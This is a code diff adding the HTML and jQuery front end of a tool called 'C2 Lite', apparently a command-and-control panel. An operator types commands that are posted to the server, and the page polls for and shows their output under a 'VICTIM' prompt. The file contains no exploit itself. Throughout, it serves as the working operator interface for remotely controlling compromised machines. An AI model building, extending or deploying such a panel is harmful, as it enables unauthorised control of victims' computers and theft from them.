@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>C2 Lite</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            background-color: #1a1a1a;
+            font-family: 'Courier New', Courier, monospace;
+            padding: 20px;
+            color: white;
+        }
+        .terminal {
+            background-color: #000;
+            border: 1px solid #fff;
+            border-radius: 5px;
+            padding: 20px;
+            overflow-y: auto;
+            max-height: 400px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            white-space: pre-wrap; /* Ensures proper formatting */
+        }
+        .cmd-prompt {
+            color: #4CAF50;
+            font-weight: bold;
+        }
+        .cmd-output {
+            color: #FFA500;
+            margin-bottom: 10px;
+        }
+        .form-control {
+            background-color: #333;
+            color: #fff;
+            border: 1px solid #fff;
+            padding: 10px;
+            width: 100%;
+            outline: none;
+        }
+        .btn-primary {
+            background-color: #007bff;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container mx-auto">
+        <h1 class="text-white text-center text-4xl font-bold mt-8">C2 Lite</h1>
+        <p class="text-white text-center mb-8">by C0NQU15T4D0R</p>
+
+        <!-- Terminal Output -->
+        <div id="terminal" class="terminal"></div>
+
+        <!-- Command Input Form -->
+        <form id="messageForm">
+            <input type="text" class="form-control" id="messageInput" placeholder="Enter command...">
+            <button type="submit" class="btn btn-primary">Submit</button>
+        </form>
+    </div>
+
+    <script>
+        function refreshTerminal() {
+            $.ajax({
+                url: '/history',
+                type: 'GET',
+                dataType: 'json',
+                success: function(data) {
+                    var terminalContent = "";
+
+                    data.forEach(entry => {
+                        if (entry["command"] === "clear_terminal_now") {
+                            terminalContent = ""; // Clear terminal on special command
+                        } else {
+                            terminalContent += `<div class="cmd-prompt">C0NQU15T4D0R$~ ${entry["command"]}</div>`;
+                            terminalContent += `<div class="cmd-output"><pre>VICTIM$~ ${entry["output"]}</pre></div>`;
+                        }
+                    });
+
+                    $("#terminal").html(terminalContent);
+                    $("#terminal").scrollTop($("#terminal")[0].scrollHeight); // Auto-scroll to latest output
+                }
+            });
+        }
+
+        $(document).ready(function() {
+            refreshTerminal();
+            setInterval(refreshTerminal, 5000);
+
+            $('#messageForm').submit(function(event) {
+                event.preventDefault();
+                var message = $('#messageInput').val().trim();
+                if (message === '') return;
+
+                $.ajax({
+                    url: '/submit',
+                    type: 'POST',
+                    contentType: 'application/json',
+                    data: JSON.stringify({ message: message }),
+                    success: function(response) {
+                        $('#messageInput').val('');
+                    }
+                });
+            });
+        });
+    </script>
+</body>
+</html>
